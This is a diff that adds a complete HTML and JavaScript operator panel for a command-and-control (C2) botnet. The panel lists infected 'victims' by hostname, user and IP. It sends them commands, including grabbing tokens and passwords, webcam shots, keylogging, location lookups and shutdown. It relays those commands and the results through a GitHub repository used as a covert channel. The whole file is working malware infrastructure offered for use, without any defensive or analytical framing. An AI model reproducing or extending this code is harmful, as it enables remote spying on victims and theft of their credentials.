@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C2 Panel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:monospace}
+body{background:#0a0a0a;color:#ccc;display:flex;height:100vh}
+.sidebar{width:260px;background:#111;border-right:1px solid #222;padding:15px;overflow-y:auto}
+.sidebar h2{color:#4a90d9;margin-bottom:15px;font-size:16px}
+.victim{background:#1a1a1a;border:1px solid #333;padding:10px;margin-bottom:8px;border-radius:6px;cursor:pointer}
+.victim:hover{background:#222}
+.victim.active{border-color:#4a90d9;background:#1a1a2e}
+.victim .name{color:#fff;font-size:13px;font-weight:bold}
+.victim .ip{color:#888;font-size:11px}
+.victim .status{font-size:10px;margin-top:4px}
+.victim .online{color:#4caf50}
+.victim .offline{color:#f44336}
+.main{flex:1;display:flex;flex-direction:column}
+.topbar{background:#111;border-bottom:1px solid #222;padding:12px 20px;display:flex;justify-content:space-between;align-items:center}
+.topbar h3{color:#fff;font-size:15px}
+.topbar .count{color:#4a90d9;font-size:13px}
+.terminal{flex:1;background:#0a0a0a;padding:15px;overflow-y:auto;font-size:12px;line-height:1.6}
+.terminal .msg{margin-bottom:4px}
+.terminal .sent{color:#4a90d9}
+.terminal .recv{color:#4caf50}
+.terminal .error{color:#f44336}
+.input-area{background:#111;border-top:1px solid #222;padding:10px 20px;display:flex;gap:10px}
+.input-area select{background:#1a1a1a;color:#fff;border:1px solid #333;padding:8px 12px;border-radius:4px;font-size:13px}
+.input-area input{flex:1;background:#1a1a1a;color:#fff;border:1px solid #333;padding:8px 12px;border-radius:4px;font-size:13px;outline:none}
+.input-area input:focus{border-color:#4a90d9}
+.input-area button{background:#4a90d9;color:#fff;border:none;padding:8px 20px;border-radius:4px;cursor:pointer;font-size:13px;font-weight:bold}
+.input-area button:hover{background:#3b79b8}
+.broadcast{background:#e65100;margin-right:5px}
+.broadcast:hover{background:#bf360c}
+</style>
+</head>
+<body>
+<div class="sidebar" id="victimList">
+<h2>☠️ C2 Panel</h2>
+<div id="victims"></div>
+</div>
+<div class="main">
+<div class="topbar">
+<h3 id="currentVictim">Select a target</h3>
+<span class="count" id="victimCount">0 online</span>
+</div>
+<div class="terminal" id="terminal"></div>
+<div class="input-area">
+<select id="cmdSelect">
+<option value="">Quick Cmd...</option>
+<option value=";sysinfo">Sysinfo</option>
+<option value=";screenshot">Screenshot</option>
+<option value=";tokens">Grab Tokens</option>
+<option value=";passwords">Grab Passwords</option>
+<option value=";wifi">WiFi Profiles</option>
+<option value=";ls">List Files</option>
+<option value=";location">Get Location</option>
+<option value=";webcam">Webcam Shot</option>
+<option value=";keylogstart">Keylog Start</option>
+<option value=";keylogdump">Keylog Dump</option>
+<option value=";shutdown">Shutdown</option>
+<option value=";msgbox">Message Box</option>
+</select>
+<input type="text" id="cmdInput" placeholder=";command args" onkeydown="if(event.key==='Enter')sendCmd()">
+<button onclick="sendCmd()">Send</button>
+<button class="broadcast" onclick="broadcastCmd()">📢 All</button>
+</div>
+</div>
+<script>
+const GITHUB_USER = "YOUR_GITHUB_USERNAME";
+const GITHUB_REPO = "YOUR_REPO_NAME";
+const GITHUB_TOKEN = "YOUR_GITHUB_PERSONAL_ACCESS_TOKEN";
+const POLL_INTERVAL = 3000;
+let selectedVictim = null;
+let victims = {};
+let commandLog = {};
+
+async function loadVictims() {
+    try {
+        const resp = await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/victims.json`, {
+            headers: { "Authorization": `token ${GITHUB_TOKEN}` }
+        });
+        if (!resp.ok) return;
+        const data = await resp.json();
+        const content = JSON.parse(atob(data.content));
+        victims = content;
+        renderVictims();
+        if (selectedVictim && victims[selectedVictim]) {
+            document.getElementById("currentVictim").textContent = `${victims[selectedVictim].hostname} (${selectedVictim})`;
+        }
+    } catch(e) {}
+}
+
+function renderVictims() {
+    const container = document.getElementById("victims");
+    let online = 0;
+    let html = "";
+    for (const [id, v] of Object.entries(victims)) {
+        if (Date.now()/1000 - v.last_seen < 120) {
+            online++;
+            html += `<div class="victim ${selectedVictim===id?'active':''}" onclick="selectVictim('${id}')">
+                <div class="name">${v.hostname}</div>
+                <div class="ip">${v.user}@${v.ip}</div>
+                <div class="status online">● Online</div>
+            </div>`;
+        }
+    }
+    for (const [id, v] of Object.entries(victims)) {
+        if (Date.now()/1000 - v.last_seen >= 120) {
+            html += `<div class="victim ${selectedVictim===id?'active':''}" onclick="selectVictim('${id}')">
+                <div class="name">${v.hostname}</div>
+                <div class="ip">${v.user}@${v.ip}</div>
+                <div class="status offline">● Offline</div>
+            </div>`;
+        }
+    }
+    container.innerHTML = html;
+    document.getElementById("victimCount").textContent = `${online} online`;
+}
+
+function selectVictim(id) {
+    selectedVictim = id;
+    renderVictims();
+    document.getElementById("currentVictim").textContent = `${victims[id].hostname} (${id})`;
+    loadResults(id);
+}
+
+async function sendCmd() {
+    const input = document.getElementById("cmdInput");
+    const cmd = input.value.trim();
+    if (!cmd) return;
+    const target = selectedVictim || "broadcast";
+    await pushCommand(target, cmd);
+    addToTerminal("sent", `[${target}] $ ${cmd}`);
+    input.value = "";
+}
+
+async function broadcastCmd() {
+    const input = document.getElementById("cmdInput");
+    const cmd = input.value.trim();
+    if (!cmd) return;
+    await pushCommand("broadcast", cmd);
+    addToTerminal("sent", `[ALL] $ ${cmd}`);
+    input.value = "";
+}
+
+async function pushCommand(target, cmd) {
+    try {
+        const path = `commands/${target}.json`;
+        let existing = { commands: [] };
+        try {
+            const resp = await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${path}`, {
+                headers: { "Authorization": `token ${GITHUB_TOKEN}` }
+            });
+            if (resp.ok) {
+                const data = await resp.json();
+                existing = JSON.parse(atob(data.content));
+                existing._sha = data.sha;
+            }
+        } catch(e) {}
+        existing.commands.push({ cmd, time: Date.now(), executed: false });
+        const body = {
+            message: `Cmd: ${cmd}`,
+            content: btoa(JSON.stringify(existing, null, 2))
+        };
+        if (existing._sha) body.sha = existing._sha;
+        await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${path}`, {
+            method: "PUT",
+            headers: {
+                "Authorization": `token ${GITHUB_TOKEN}`,
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(body)
+        });
+    } catch(e) { addToTerminal("error", `Failed: ${e}`); }
+}
+
+async function loadResults(victimId) {
+    if (!victimId) return;
+    try {
+        const path = `results/${victimId}.json`;
+        const resp = await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${path}`, {
+            headers: { "Authorization": `token ${GITHUB_TOKEN}` }
+        });
+        if (!resp.ok) return;
+        const data = await resp.json();
+        const results = JSON.parse(atob(data.content));
+        document.getElementById("terminal").innerHTML = "";
+        for (const r of results) {
+            addToTerminal("sent", `$ ${r.cmd}`);
+            addToTerminal("recv", r.output);
+        }
+    } catch(e) {}
+}
+
+function addToTerminal(cls, text) {
+    const term = document.getElementById("terminal");
+    term.innerHTML += `<div class="msg ${cls}">${text.replace(/</g,'&lt;')}</div>`;
+    term.scrollTop = term.scrollHeight;
+}
+
+setInterval(loadVictims, POLL_INTERVAL);
+loadVictims();
+</script>
+</body>
+</html>
